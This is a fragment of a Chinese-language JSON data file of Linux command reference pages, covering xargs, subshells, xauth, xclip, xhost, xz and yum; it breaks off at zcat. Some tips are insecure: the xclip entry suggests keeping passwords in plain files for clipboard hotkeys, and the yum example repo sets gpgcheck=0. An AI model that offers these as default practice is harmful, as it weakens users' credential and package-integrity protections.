-f\n</code></pre>\n<p>xargs -0 将 <code>\\0</code> 作为定界符。</p>\n<p>统计一个源代码目录中所有 php 文件的行数：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">find</span> . -<span class=\"hljs-built_in\">type</span> f -<span class=\"hljs-built_in\">name</span> <span class=\"hljs-string\">\"*.php\"</span> -print0 | xargs -<span class=\"hljs-number\">0</span> wc -l\n</code></pre>\n<p>查找所有的 jpg 文件，并且压缩它们：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">find</span> . -type f -name <span class=\"hljs-string\">\"*.jpg\"</span> -<span class=\"hljs-built_in\">print</span> | xargs tar -czvf images.tar.gz\n</code></pre>\n<h4 id=\"打印出执行的命令\">打印出执行的命令</h4>\n<p>结合 <code>-t</code> 选项可以打印出 <code>xargs</code> 执行的命令</p>\n<pre><code><span class=\"language-xml\">ls | xargs -t -I</span><span class=\"hljs-template-variable\">{}</span><span class=\"language-xml\"> echo </span><span class=\"hljs-template-variable\">{}</span>\n</code></pre>\n<p>会输出当前目录下的文件列表和执行的 echo 命令</p>\n<h4 id=\"使用--p-选项确认执行的命令\">使用 -p 选项确认执行的命令</h4>\n<p><code>-p</code> 选项会在执行每一个命令时弹出确认，当你需要非常准确的确认每一次操作时可以使用 <code>-p</code> 参数，比如，查找当前目录下 <code>.log</code> 文件，每一次删除都需要确认：</p>\n<pre><code><span class=\"hljs-built_in\">find</span> . -maxdepth 1 -name <span class=\"hljs-string\">\"*.log\"</span> | xargs -p -I{} rm {}\n</code></pre>\n<h4 id=\"执行多个命令\">执行多个命令</h4>\n<p>使用 <code>-I</code> 选项可以让 <code>xargs</code> 执行多个命令</p>\n<pre><code><span class=\"hljs-keyword\">cat</span> foo.txt\n<span class=\"hljs-keyword\">one</span>\n<span class=\"hljs-keyword\">two</span>\nthree\n\n<span class=\"hljs-keyword\">cat</span> foo.txt | xargs -I % <span class=\"hljs-keyword\">sh</span> -c 'echo %; <span class=\"hljs-keyword\">mkdir</span> %'\n<span class=\"hljs-keyword\">one</span>\n<span class=\"hljs-keyword\">two</span>\nthree\n\n<span class=\"hljs-keyword\">ls</span>\n<span class=\"hljs-keyword\">one</span> <span class=\"hljs-keyword\">two</span> three\n</code></pre>\n<h4 id=\"其他应用\">其他应用</h4>\n<p><strong>xargs 其他应用</strong></p>\n<p>假如你有一个文件包含了很多你希望下载的 URL，你能够使用 xargs 下载所有链接：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">cat</span> url<span class=\"hljs-literal\">-list</span>.txt | xargs <span class=\"hljs-built_in\">wget</span> <span class=\"hljs-literal\">-c</span>\n</code></pre>\n<h3 id=\"子-shell（subshells）\">子 Shell（Subshells）</h3>\n<p>运行一个 shell 脚本时会启动另一个命令解释器.，就好像你的命令是在命令行提示下被解释的一样，类似于批处理文件里的一系列命令。每个 shell 脚本有效地运行在父 shell(parent shell) 的一个子进程里。这个父 shell 是指在一个控制终端或在一个 xterm 窗口中给你命令指示符的进程。</p>\n<pre><code class=\"language-shell\">cmd1 | <span class=\"hljs-type\">( cmd2</span>; cmd3; cmd4 ) | <span class=\"hljs-type\">cmd5</span>\n</code></pre>\n<p>如果 cmd2 是 cd /，那么就会改变子 Shell 的工作目录，这种改变只是局限于子 shell 内部，cmd5 则完全不知道工作目录发生的变化。子 shell 是嵌在圆括号 () 内部的命令序列，子 Shell 内部定义的变量为局部变量。</p>\n<p>子 shell 可用于为一组命令设定临时的环境变量：</p>\n<pre><code class=\"language-shell\">COMMAND1\nCOMMAND2\nCOMMAND3\n(\n  IFS=:\n  PATH=/bin\n  unset TERMINFO\n  set -C\n  shift <span class=\"hljs-number\">5</span>\n  COMMAND4\n  COMMAND5\n  <span class=\"hljs-keyword\">exit</span> <span class=\"hljs-number\">3</span> <span class=\"hljs-comment\"># 只是从子 shell 退出。</span>\n)\n<span class=\"hljs-comment\"># 父 shell 不受影响，变量值没有更改。</span>\nCOMMAND6\nCOMMAND7\n</code></pre>\n<h2 id=\"reference\">reference</h2>\n<ul>\n<li><a href=\"https://shapeshed.com/unix-xargs/\">https://shapeshed.com/unix-xargs/</a></li>\n</ul>\n<!-- Linux 命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "xauth",
        "des": "显示和编辑被用于连接X服务器的认证信息",
        "body": "<h1 id=\"xauth\">xauth</h1>\n<p>显示和编辑被用于连接X服务器的认证信息</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>xauth命令</strong> 用于显示和编辑被用于连接X服务器的认证信息。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">xauth</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-f：不使用默认的认证文件，而使用指定的认证文件；</span>\n<span class=\"hljs-deletion\">-q：安静模式，不打印未请求的状态信息；</span>\n<span class=\"hljs-deletion\">-v：详细模式，打印指定的各种操作信息；</span>\n<span class=\"hljs-deletion\">-i：忽略认证文件锁定；</span>\n<span class=\"hljs-deletion\">-b：执行任何操作，终端认证文件锁定。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<ul>\n<li>  add：添加认证条目到认证文件中；</li>\n<li>  extract：将指定的设备内容加入到指定的密码文件中；</li>\n<li>  info：显示授权文件相关信息；</li>\n<li>  exit：退出交互模式；</li>\n<li>  list：列出给定的显示设备的内容；</li>\n<li>  merge：合并多个授权文件内容；</li>\n<li>  extract：将指定设备内容写入指定的授权文件；</li>\n<li>  nextrct：将指定设备内容写入指定的授权文件；</li>\n<li>  nmerge：合并多个授权文件内容；</li>\n<li>  remove：删除指定显示设备的授权条目；</li>\n<li>  source：从指定文件读取包含xauth的内容指令。</li>\n</ul>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "xclip",
        "des": "管理 X 粘贴板",
        "body": "<h1 id=\"xclip\">xclip</h1>\n<p>管理 X 粘贴板</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p>在 X 系统里面，从一个窗口复制一段文字到另一个窗口，有两套机制，分别是 Selections 和 cut buffers。</p>\n<p>常用的 copy &amp; paste 是利用的 cut buffers 机制;另外用鼠标选中一段文字，然后在另一个窗口按鼠标中键实现复制，利用的是 selections 机制。selection 又可以分为 master 和 slave selection。</p>\n<p>当用鼠标选中一段文件，这段文字就自动被复制到 master selection。然后在另一个地方按鼠标中键，就自动把 master selection 的内容粘贴出来。</p>\n<p>当你想复制少量文字的时候，两种方法都是很方便的。但是当复制大段文字的时候就挺麻烦。另外就是你可能会频繁的执行一些复制粘贴工作，不停的用鼠标选中文字，然后再粘贴。这是对手指的折磨。</p>\n<p>我忍受不了这种折磨，所以发现了 xclip， 方便的管理 X selections 里面内容的工具。</p>\n<p>比如如下命令就把文件 /etc/passwd 的内容复制到 X master selections 里面了。</p>\n<pre><code class=\"language-shell\">xclip -i <span class=\"hljs-regexp\">/etc/</span>passwd\n</code></pre>\n<p>然后到别的地方就能复制出来，利用鼠标中键。或者是更舒服的 shift+insert。 我现在最常用的方法是通过键盘绑定来管理 X master selections 的内容。比如 alt+F1 就能把我的 ~/f1 的内容复制到 X master selections，alt+F2 复制 ~/f2 的内容。这样就能把你需要经常用到的内容方便的进行复制粘贴。比如常用的密码啥的。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "xhost",
        "des": "制哪些X客户端能够在X服务器上显示",
        "body": "<h1 id=\"xhost\">xhost</h1>\n<p>制哪些X客户端能够在X服务器上显示</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>xhost命令</strong> 是X服务器的访问控制工具，用来控制哪些X客户端能够在X服务器上显示。该命令必须从有显示连接的机器上运行。可以通过使用<code>-host</code>参数，从访问列表中除去一个名称。不要从访问列表中除去当前的名称。如果已经这样做了，请在作出任何更改之前注销系统。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">xhost</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<ul>\n<li>+：关闭访问控制，允许任何主机访问本地的X服务器；</li>\n<li>-：打开访问控制，仅允许授权清单中的主机访问本地的X服务器。</li>\n</ul>\n<p>输入无变量的xhost命令将显示访问X服务器的当前主机名，并显示一条消息表明访问是否已启用。</p>\n<p>为了安全起见，只能从控制主机运行影响访问控制的选项。对于工作站来说，这台机器也就是服务器。对于X终端来说，这台机器是登录主机。</p>\n<p>要在缺省情况下启用远程名称，可以在<code>/etc/X?.hosts</code>文件中定义名称，其中<code>?</code>为启用访问的显示器号。</p>\n<p>例如，显示器<code>jeanne:0</code>可以由使用jeanne的缺省主机名的系统上的<code>/etc/X0.hosts</code>文件中定义的系统访问。在显示名称和文件名中，0表明已定义的远程系统允许通过增强X-Windows访问的显示器号。</p>\n<p>注意：<code>-name</code>参数，定义要从X服务器访问列表中除去的主机名。已有的连接没有被中断，但将拒绝新的连接请求。注意：可以除去当前的机器；然而，不允许进行进一步的连接（包括试图将其添加回来）。再一次启用本地连接的唯一方法就是将服务器复位（因此也会中断所有连接）。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "xinit",
        "des": "是Linux下X-Window系统的初始化程序",
        "body": "<h1 id=\"xinit\">xinit</h1>\n<p>是Linux下X-Window系统的初始化程序</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>xinit命令</strong> 是Linux下X-Window系统的初始化程序，主要完成X服务器的初始化设置。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">xinit</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<ul>\n<li>客户端选项：客户端指令及选项；</li>\n<li>--：用于区分客户端选项和服务器端选项；</li>\n<li>服务器端选项：服务器端选项指令及选项。</li>\n</ul>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "xlsatoms",
        "des": "列出X服务器内部所有定义的原子成分",
        "body": "<h1 id=\"xlsatoms\">xlsatoms</h1>\n<p>列出X服务器内部所有定义的原子成分</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>xlsatoms命令</strong> 用于列出X服务器内部所有定义的原子成分，每个原子成分都有自身的编号。可利用参数设置列表范围，或直接指定欲查询的成分名称。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">xlsatoms</span><span class=\"hljs-params\">(选项)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<ul>\n<li>-display&lt;显示器编号&gt;：指定X Server连接的显示器编号，该编号由\"0\"开始计算，依序递增；</li>\n<li>-format&lt;输出格式&gt;：设置成分清单的列表格式，您可使用控制字符改变显示样式；</li>\n<li>-name&lt;成分名称&gt;：列出指定的成分；</li>\n<li>-range&lt;列表范围&gt;：设置成分清单的列表范围。</li>\n</ul>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "xlsclients",
        "des": "列出显示器中的客户端应用程序",
        "body": "<h1 id=\"xlsclients\">xlsclients</h1>\n<p>列出显示器中的客户端应用程序</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>xlsclients命令</strong> 用来列出显示器中的客户端应用程序。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">xlsclients</span><span class=\"hljs-params\">(选项)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-a：列出所有显示器的客户端应用程序信息；</span>\n<span class=\"hljs-deletion\">-display&lt;显示器编号&gt;：指定X Server连接的显示器编号，该编号由\"0\"开始计算，依序递增；</span>\n<span class=\"hljs-deletion\">-l：使用详细格式列表；</span>\n<span class=\"hljs-deletion\">-m&lt;最大指令长度&gt;：设置显示指令信息的最大长度，单位以字符计算。</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "xlsfonts",
        "des": "列出X Server使用的字体",
        "body": "<h1 id=\"xlsfonts\">xlsfonts</h1>\n<p>列出X Server使用的字体</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>xlsfonts命令</strong> 列出X Server使用的字体，也能使用范本样式仅列出的符合条件的字体。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">xlsfonts</span><span class=\"hljs-params\">(选项)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-l：除字体名称外，同时列出字体的属性；</span>\n<span class=\"hljs-deletion\">-ll：此参数的效果和指定\"l\"参数类似，但显示更详细的信息；</span>\n<span class=\"hljs-deletion\">-lll：此参数的效果和指定\"ll\"参数类似，但显示更详细的信息；</span>\n<span class=\"hljs-deletion\">-m：配合参数\"-l\"使用时，一并列出字体大小的上下限；</span>\n<span class=\"hljs-deletion\">-n&lt;显示栏位数&gt;：设置每列显示的栏位数；</span>\n<span class=\"hljs-deletion\">-o：以OpenFont的形式列出字体清单；</span>\n<span class=\"hljs-deletion\">-u：列出字体清单时不依照其名称排序；</span>\n<span class=\"hljs-deletion\">-w&lt;每列字符数&gt;：设置每列的最大字符数。</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "xset",
        "des": "设置X-Window系统中的用户爱好的实用工具",
        "body": "<h1 id=\"xset\">xset</h1>\n<p>设置X-Window系统中的用户爱好的实用工具</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>xset命令</strong> 是设置X-Window系统中的用户爱好的实用工具。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">xset</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-b：蜂鸣器开关设置；</span>\n<span class=\"hljs-deletion\">-c：键盘按键声响设置。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<ul>\n<li>c：键盘按键声响设置；</li>\n<li>s：屏幕保护程序设置。</li>\n</ul>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "xz",
        "des": "POSIX 平台开发具有高压缩率的工具",
        "body": "<h1 id=\"xz\">xz</h1>\n<p>POSIX 平台开发具有高压缩率的工具</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>xz命令</strong> XZ Utils 是为 POSIX 平台开发具有高压缩率的工具。它使用 LZMA2 压缩算法，生成的压缩文件比 POSIX 平台传统使用的 gzip、bzip2 生成的压缩文件更小，而且解压缩速度也很快。最初 XZ Utils 的是基于 LZMA-SDK 开发，但是 LZMA-SDK 包含了一些 WINDOWS 平台的特性，所以 XZ Utils 为以适应 POSIX 平台作了大幅的修改。XZ Utils 的出现也是为了取代 POSIX 系统中旧的 LZMA Utils。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">xz</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\nxz <span class=\"hljs-selector-attr\">[OPTION]</span>... <span class=\"hljs-selector-attr\">[FILE]</span>...\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\">-z, <span class=\"hljs-params\">--compress</span>    <span class=\"hljs-comment\"># 强制压缩</span>\n-d, <span class=\"hljs-params\">--decompress</span>, <span class=\"hljs-params\">--uncompress</span>\n                  <span class=\"hljs-comment\"># force decompression</span>\n-t, <span class=\"hljs-params\">--test</span>        <span class=\"hljs-comment\"># 测试压缩文件的完整性</span>\n-l, <span class=\"hljs-params\">--list</span>        <span class=\"hljs-comment\"># 列出有关.xz文件的信息</span>\n-k, <span class=\"hljs-params\">--keep</span>        <span class=\"hljs-comment\"># 保留（不要删除）输入文件</span>\n-f, <span class=\"hljs-params\">--force</span>       <span class=\"hljs-comment\"># 强制覆盖输出文件和（解）压缩链接</span>\n-c, <span class=\"hljs-params\">--stdout</span>, <span class=\"hljs-params\">--to-stdout</span>\n                  <span class=\"hljs-comment\"># 写入标准输出，不要删除输入文件</span>\n-0 <span class=\"hljs-string\">...</span> -9         <span class=\"hljs-comment\"># 压缩预设; 默认为6; 取压缩机*和*</span>\n                  <span class=\"hljs-comment\"># 使用7-9之前解压缩内存使用量考虑在内！</span>\n-e, <span class=\"hljs-params\">--extreme</span>     <span class=\"hljs-comment\"># 尝试通过使用更多的CPU时间来提高压缩比;</span>\n                  <span class=\"hljs-comment\"># 要求不影响解压缩存储器</span>\n-T, <span class=\"hljs-params\">--threads=NUM</span> <span class=\"hljs-comment\"># 最多使用NUM个线程; 默认值为1;  set to 0</span>\n                  <span class=\"hljs-comment\"># 设置为0，使用与处理器内核一样多的线程</span>\n-q, <span class=\"hljs-params\">--quiet</span>       <span class=\"hljs-comment\"># 抑制警告; 指定两次以抑制错误</span>\n-v, <span class=\"hljs-params\">--verbose</span>     <span class=\"hljs-comment\"># 冗长; 指定两次更详细</span>\n-h, <span class=\"hljs-params\">--help</span>        <span class=\"hljs-comment\"># 显示这个简洁的帮助并退出</span>\n-H, <span class=\"hljs-params\">--long-help</span>   <span class=\"hljs-comment\"># 显示更多帮助（还列出了高级选项）</span>\n-V, <span class=\"hljs-params\">--version</span>     <span class=\"hljs-comment\"># 显示版本号并退出</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<ul>\n<li>源文件：指定连接的源文件。</li>\n<li>目标文件：指定源文件的目标连接文件。</li>\n</ul>\n<h3 id=\"实例\">实例</h3>\n<p>压缩一个文件 test.txt，压缩成功后生成 test.txt.xz, 原文件会被删除。</p>\n<pre><code class=\"language-shell\">$ xz <span class=\"hljs-keyword\">test</span>.txt\n$ <span class=\"hljs-keyword\">ls</span> <span class=\"hljs-keyword\">test</span>.txt*\n\n<span class=\"hljs-keyword\">test</span>.txt.xz\n</code></pre>\n<p>解压 test.txt.xz 文件，并使用参数 -k 保持原文件不被删除</p>\n<pre><code class=\"language-shell\">$ xz -<span class=\"hljs-keyword\">d</span> -k <span class=\"hljs-keyword\">test</span>.txt.xz\n$ <span class=\"hljs-keyword\">ls</span> <span class=\"hljs-keyword\">test</span>.txt*\n\n<span class=\"hljs-keyword\">test</span>.txt.xz <span class=\"hljs-keyword\">test</span>.txt\n</code></pre>\n<p>使用参数 -l 显示 .xz 文件的基本信息。基本信息包括压缩率、数据完整性验证方式等。也可以和参数 -v 或 -vv 配合显示更详尽的信息。</p>\n<pre><code class=\"language-shell\">xz -l <span class=\"hljs-keyword\">index</span>.txt.xz\n# Strms  Blocks   Compressed Uncompressed  Ratio  <span class=\"hljs-keyword\">Check</span>   <span class=\"hljs-keyword\">Filename</span>\n#    1       1        768 B      1,240 B  0.619  CRC64   <span class=\"hljs-keyword\">index</span>.txt.\n</code></pre>\n<p>使用参数 -0, -1, -2, … -6, … -9 或参数 --fast, --best 设定压缩率。xz 命令的默认为 -6 ，对于大多数系统来说，甚至是一些较旧的系统，-4 … -6 压缩率预设值都不错的表现。</p>\n<pre><code class=\"language-shell\">$ xz -k<span class=\"hljs-number\">7</span> xz_pipe_decomp_mini.<span class=\"hljs-keyword\">c</span>\n$ xz -k --<span class=\"hljs-keyword\">fast</span> xz_pipe_decomp_mini.<span class=\"hljs-keyword\">c</span>\n</code></pre>\n<p>使用参数 -H 显示 xz 命令所有 options. 参数 -H 比使用参数 --help 显示的内容更详细。</p>\n<pre><code class=\"language-shell\">$ xz -H  <span class=\"hljs-string\">| more</span>\n</code></pre>\n<p>借助 xargs 命令并行压缩多文件。下面的命令行可以将 /var/log 目录下所有的扩展名为 .log 的文件压缩。通过 xargs 命令同时运行多个 xz 进行压缩。</p>\n<pre><code class=\"language-shell\"># 运行此命令须有 root 权限。\n<span class=\"hljs-built_in\">find</span> /<span class=\"hljs-built_in\">var</span>/<span class=\"hljs-built_in\">log</span> -<span class=\"hljs-built_in\">type</span> f -iname <span class=\"hljs-string\">\"*.log\"</span> -print0 | xargs -<span class=\"hljs-symbol\">P4</span> -<span class=\"hljs-symbol\">n16</span> xz -<span class=\"hljs-symbol\">T1</span>\n</code></pre>\n"
    },
    {
        "title": "yes",
        "des": "重复打印指定字符串",
        "body": "<h1 id=\"yes\">yes</h1>\n<p>重复打印指定字符串</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>yes命令</strong> 在命令行中输出指定的字符串，直到yes进程被杀死。不带任何参数输入yes命令默认的字符串就是y。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">yes</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>字符串：指定要重复打印的字符串。</p>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-symbol\">@localhost</span> ~]<span class=\"hljs-meta\"># yes testline</span>\n\ntestline\ntestline\ntestline\ntestline\ntestline\ntestline\ntestline\ntestline\n...一直重复打印 testline，按Ctrl+C结束。\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "ypdomainname",
        "des": "显示主机的NIS的域名",
        "body": "<h1 id=\"ypdomainname\">ypdomainname</h1>\n<p>显示主机的NIS的域名</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>ypdomainname命令</strong> 显示主机的NIS的域名。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">ypdomainname</span><span class=\"hljs-params\">(选项)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-v：详细信息模式。</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "yum",
        "des": "基于RPM的软件包管理器",
        "body": "<h1 id=\"yum\">yum</h1>\n<p>基于RPM的软件包管理器</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>yum命令</strong> 是在Fedora和RedHat以及SUSE中基于rpm的软件包管理器，它可以使系统管理人员交互和自动化地更新与管理RPM软件包，能够从指定的服务器自动下载RPM包并且安装，可以自动处理依赖性关系，并且一次安装所有依赖的软体包，无须繁琐地一次次下载、安装。</p>\n<p>yum提供了查找、安装、删除某一个、一组甚至全部软件包的命令，而且命令简洁而又好记。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">yum</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-h：显示帮助信息；</span>\n<span class=\"hljs-deletion\">-y：对所有的提问都回答“yes”；</span>\n<span class=\"hljs-deletion\">-c：指定配置文件；</span>\n<span class=\"hljs-deletion\">-q：安静模式；</span>\n<span class=\"hljs-deletion\">-v：详细模式；</span>\n<span class=\"hljs-deletion\">-d：设置调试等级（0-10）；</span>\n<span class=\"hljs-deletion\">-e：设置错误等级（0-10）；</span>\n<span class=\"hljs-deletion\">-R：设置yum处理一个命令的最大等待时间；</span>\n<span class=\"hljs-deletion\">-C：完全从缓存中运行，而不去下载或者更新任何头文件。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<pre><code class=\"language-shell\">install：安装rpm软件包；\n<span class=\"hljs-keyword\">update</span>：更新rpm软件包；\ncheck-<span class=\"hljs-keyword\">update</span>：检查是否有可用的更新rpm软件包；\n<span class=\"hljs-built_in\">remove</span>：删除指定的rpm软件包；\n<span class=\"hljs-keyword\">list</span>：显示软件包的信息；\n<span class=\"hljs-built_in\">search</span>：检查软件包的信息；\ninfo：显示指定的rpm软件包的描述信息和概要信息；\nclean：清理yum过期的缓存；\n<span class=\"hljs-keyword\">shell</span>：进入yum的<span class=\"hljs-keyword\">shell</span>提示符；\nresolvedep：显示rpm软件包的依赖关系；\nlocalinstall：安装本地的rpm软件包；\nlocalupdate：显示本地rpm软件包进行更新；\ndeplist：显示rpm软件包的所有依赖关系。\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p>部分常用的命令包括：</p>\n<ul>\n<li>  自动搜索最快镜像插件：<code>yum install yum-fastestmirror</code></li>\n<li>  安装yum图形窗口插件：<code>yum install yumex</code></li>\n<li>  查看可能批量安装的列表：<code>yum grouplist</code></li>\n</ul>\n<p><strong>安装</strong></p>\n<pre><code class=\"language-shell\">yum <span class=\"hljs-keyword\">install</span>              <span class=\"hljs-comment\">#全部安装</span>\nyum <span class=\"hljs-keyword\">install</span> package1     <span class=\"hljs-comment\">#安装指定的安装包package1</span>\nyum groupinsall group1   <span class=\"hljs-comment\">#安装程序组group1</span>\n</code></pre>\n<p><strong>更新和升级</strong></p>\n<pre><code class=\"language-shell\">yum update               <span class=\"hljs-comment\">#全部更新</span>\nyum update package1      <span class=\"hljs-comment\">#更新指定程序包package1</span>\nyum<span class=\"hljs-built_in\"> check-update </span>        <span class=\"hljs-comment\">#检查可更新的程序</span>\nyum upgrade package1     <span class=\"hljs-comment\">#升级指定程序包package1</span>\nyum groupupdate group1   <span class=\"hljs-comment\">#升级程序组group1</span>\n</code></pre>\n<p><strong>查找和显示</strong></p>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># 检查 MySQL 是否已安装</span>\n<span class=\"hljs-attribute\">yum</span> list installed | grep mysql\nyum list installed mysql*\n\nyum <span class=\"hljs-literal\">info</span> package1      <span class=\"hljs-comment\">#显示安装包信息package1</span>\nyum list               <span class=\"hljs-comment\">#显示所有已经安装和可以安装的程序包</span>\nyum list package1      <span class=\"hljs-comment\">#显示指定程序包安装情况package1</span>\nyum groupinfo group1   <span class=\"hljs-comment\">#显示程序组group1信息yum search string 根据关键字string查找安装包</span>\n</code></pre>\n<p><strong>删除程序</strong></p>\n<pre><code class=\"language-shell\">yum remove &amp;#<span class=\"hljs-number\">124</span>; erase package1   #删除程序包package1\nyum groupremove group1             #删除程序组group1\nyum deplist package1               #查看程序package1依赖情况\n</code></pre>\n<p><strong>清除缓存</strong></p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">yum</span> clean packages       <span class=\"hljs-comment\">#清除缓存目录下的软件包</span>\nyum clean headers        <span class=\"hljs-comment\">#清除缓存目录下的 headers</span>\nyum clean oldheaders     <span class=\"hljs-comment\">#清除缓存目录下旧的 headers</span>\n</code></pre>\n<p><strong>更多实例</strong></p>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># yum</span>\n<span class=\"hljs-regexp\">/etc/yum</span>.repos.d/       yum 源配置文件\nvi <span class=\"hljs-regexp\">/etc/yum</span>.repos.d/nginx.repo <span class=\"hljs-comment\"># 举个栗子: nginx yum源</span>\n[nginx]\nname=nginx repo\nbaseurl=http:<span class=\"hljs-regexp\">//</span>nginx.org<span class=\"hljs-regexp\">/packages/</span>centos<span class=\"hljs-regexp\">/6/</span><span class=\"hljs-variable\">$basearch</span>/\ngpgcheck=<span class=\"hljs-number\">0</span>\nenabled=<span class=\"hljs-number\">1</span>\n\n<span class=\"hljs-comment\"># yum mirror</span>\nmv <span class=\"hljs-regexp\">/etc/yum</span>.repos.d<span class=\"hljs-regexp\">/CentOS-Base.repo /</span>etc<span class=\"hljs-regexp\">/yum.repos.d/</span>CentOS-Base.repo.bak\nwget https:<span class=\"hljs-regexp\">//mi</span>rror.tuna.tsinghua.edu.cn<span class=\"hljs-regexp\">/help/</span>centos/\nyum makecache\n\n<span class=\"hljs-comment\"># 添加中文语言支持</span>\nLANG=C <span class=\"hljs-comment\"># 原始语言</span>\nLANG=zh_CN.utf8 <span class=\"hljs-comment\"># 切换到中文</span>\nyum groupinstall <span class=\"hljs-string\">\"Chinese Support\"</span> <span class=\"hljs-comment\"># 添加中文语言支持</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "zcat",
        "des": "显示压缩包中文件的内容",
